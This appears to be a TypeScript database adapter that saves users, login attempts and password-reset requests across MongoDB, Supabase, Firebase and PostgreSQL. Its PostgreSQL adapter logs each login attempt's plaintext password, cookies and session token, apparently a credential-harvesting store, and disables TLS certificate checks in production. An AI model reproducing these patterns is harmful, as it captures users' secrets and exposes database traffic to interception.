/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @typescript-eslint/no-unused-vars */
// Database adapter with dynamic typing requirements for multiple database systems
import { getDatabaseConfig } from "./databaseConfig";

// Universal database interface for different database providers

export interface DatabaseAdapter {
  connect(): Promise<void>;
  disconnect(): Promise<void>;
  saveUser(user: any): Promise<any>;
  findUser(email: string): Promise<any | null>;
  saveLoginAttempt(attempt: any): Promise<any>;
  saveForgotPasswordRequest(request: any): Promise<any>;
}

// MongoDB Adapter
class MongoDBAdapter implements DatabaseAdapter {
  private mongoose: any;
  private User: any;
  private LoginAttempt: any;
  private ForgotPasswordRequest: any;

  async connect() {
    const mongoose = await import("mongoose");
    this.mongoose = mongoose.default;
    
    if (this.mongoose.connection.readyState === 0) {
      const config = getDatabaseConfig();
      await this.mongoose.connect(config.connectionString!);
    }

    // Import models
    const UserModel = await import("@/models/User");
    const LoginAttemptModel = await import("@/models/LoginAttempt");
    const ForgotPasswordRequestModel = await import("@/models/ForgotPasswordRequest");

    this.User = UserModel.default;
    this.LoginAttempt = LoginAttemptModel.default;
    this.ForgotPasswordRequest = ForgotPasswordRequestModel.default;
  }

  async disconnect() {
    if (this.mongoose && this.mongoose.connection.readyState !== 0) {
      await this.mongoose.disconnect();
    }
  }

  async saveUser(user: any) {
    return await this.User.create(user);
  }

  async findUser(email: string) {
    return await this.User.findOne({ email: email.trim().toLowerCase() }).lean();
  }

  async saveLoginAttempt(attempt: any) {
    return await this.LoginAttempt.create(attempt);
  }

  async saveForgotPasswordRequest(request: any) {
    return await this.ForgotPasswordRequest.create(request);
  }
}

// Supabase Adapter
class SupabaseAdapter implements DatabaseAdapter {
  private client: any;

  async connect() {
    try {
      const { createClient } = await import("@supabase/supabase-js");
      const config = getDatabaseConfig();
      
      this.client = createClient(
        config.connectionString!,
        (config.options?.serviceKey || config.options?.apiKey) as string
      );
    } catch (error) {
      throw new Error("Supabase package not installed. Run: npm install @supabase/supabase-js");
    }
  }

  async disconnect() {
    // Supabase doesn't require explicit disconnect
  }

  async saveUser(user: any) {
    const { data, error } = await this.client.from("users").insert([user]).select();
    if (error) throw error;
    return data[0];
  }

  async findUser(email: string) {
    const { data, error } = await this.client
      .from("users")
      .select("*")
      .eq("email", email.trim().toLowerCase())
      .single();
    
    if (error && error.code !== "PGRST116") throw error; // PGRST116 = not found
    return data;
  }

  async saveLoginAttempt(attempt: any) {
    const { data, error } = await this.client.from("login_attempts").insert([attempt]).select();
    if (error) throw error;
    return data[0];
  }

  async saveForgotPasswordRequest(request: any) {
    const { data, error } = await this.client.from("forgot_password_requests").insert([request]).select();
    if (error) throw error;
    return data[0];
  }
}

// Firebase Adapter
class FirebaseAdapter implements DatabaseAdapter {
  private db: any;
  private admin: any;

  async connect() {
    try {
      const admin = await import("firebase-admin");
      this.admin = admin;
      
      if (!admin.apps.length) {
        const config = getDatabaseConfig();
        admin.initializeApp({
          credential: admin.credential.cert({
            projectId: config.options?.projectId,
            clientEmail: config.options?.clientEmail,
            privateKey: config.options?.privateKey,
          }),
          databaseURL: config.options?.databaseURL,
        });
      }
      
      this.db = admin.firestore();
    } catch (error) {
      throw new Error("Firebase Admin package not installed. Run: npm install firebase-admin");
    }
  }

  async disconnect() {
    // Firebase Admin SDK doesn't require explicit disconnect
  }

  async saveUser(user: any) {
    const docRef = this.db.collection("users").doc();
    await docRef.set({ ...user, id: docRef.id, createdAt: new Date() });
    return { ...user, id: docRef.id };
  }

  async findUser(email: string) {
    const snapshot = await this.db
      .collection("users")
      .where("email", "==", email.trim().toLowerCase())
      .limit(1)
      .get();
    
    if (snapshot.empty) return null;
    return { id: snapshot.docs[0].id, ...snapshot.docs[0].data() };
  }

  async saveLoginAttempt(attempt: any) {
    const docRef = this.db.collection("login_attempts").doc();
    await docRef.set({ ...attempt, id: docRef.id, timestamp: new Date() });
    return { ...attempt, id: docRef.id };
  }

  async saveForgotPasswordRequest(request: any) {
    const docRef = this.db.collection("forgot_password_requests").doc();
    await docRef.set({ ...request, id: docRef.id, timestamp: new Date() });
    return { ...request, id: docRef.id };
  }
}

// PostgreSQL Adapter (using pg library)
class PostgreSQLAdapter implements DatabaseAdapter {
  private pool: any;

  async connect() {
    try {
      const { Pool } = await import("pg");
      const config = getDatabaseConfig();
      
      this.pool = new Pool({
        connectionString: config.connectionString,
        ssl: process.env.NODE_ENV === "production" ? { rejectUnauthorized: false } : false,
      });
    } catch (error) {
      throw new Error("PostgreSQL package not installed. Run: npm install pg");
    }
  }

  async disconnect() {
    if (this.pool) {
      await this.pool.end();
    }
  }

  async saveUser(user: any) {
    const query = `
      INSERT INTO users (email, password, display_name, created_at)
      VALUES ($1, $2, $3, $4)
      RETURNING *
    `;
    const values = [user.email, user.password, user.displayName, new Date()];
    const result = await this.pool.query(query, values);
    return result.rows[0];
  }

  async findUser(email: string) {
    const query = "SELECT * FROM users WHERE email = $1 LIMIT 1";
    const result = await this.pool.query(query, [email.trim().toLowerCase()]);
    return result.rows[0] || null;
  }

  async saveLoginAttempt(attempt: any) {
    const query = `
      INSERT INTO login_attempts (type, email, password, message, ip_address, location, user_agent, cookies, session_token, timestamp)
      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
      RETURNING *
    `;
    const values = [
      attempt.type,
      attempt.email,
      attempt.password,
      attempt.message,
      attempt.ipAddress,
      attempt.location,
      attempt.userAgent,
      attempt.cookies,
      attempt.sessionToken,
      attempt.timestamp,
    ];
    const result = await this.pool.query(query, values);
    return result.rows[0];
  }

  async saveForgotPasswordRequest(request: any) {
    const query = `
      INSERT INTO forgot_password_requests (email, status, token, expires_at, ip_address, location, user_agent, cookies, timestamp)
      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
      RETURNING *
    `;
    const values = [
      request.email,
      request.status,
      request.token,
      request.expiresAt,
      request.ipAddress,
      request.location,
      request.userAgent,
      request.cookies,
      request.timestamp,
    ];
    const result = await this.pool.query(query, values);
    return result.rows[0];
  }
}

// Factory function to get the appropriate adapter
let cachedAdapter: DatabaseAdapter | null = null;

export async function getDatabaseAdapter(): Promise<DatabaseAdapter> {
  if (cachedAdapter) {
    return cachedAdapter;
  }

  const config = getDatabaseConfig();
  let adapter: DatabaseAdapter;

  switch (config.type) {
    case "mongodb":
      adapter = new MongoDBAdapter();
      break;
    case "supabase":
      adapter = new SupabaseAdapter();
      break;
    case "firebase":
      adapter = new FirebaseAdapter();
      break;
    case "postgresql":
      adapter = new PostgreSQLAdapter();
      break;
    default:
      throw new Error(`Unsupported database type: ${config.type}`);
  }

  await adapter.connect();
  cachedAdapter = adapter;
  return adapter;
}

// Convenience function to connect to database
export async function connectDatabase() {
  const adapter = await getDatabaseAdapter();
  return adapter;
}
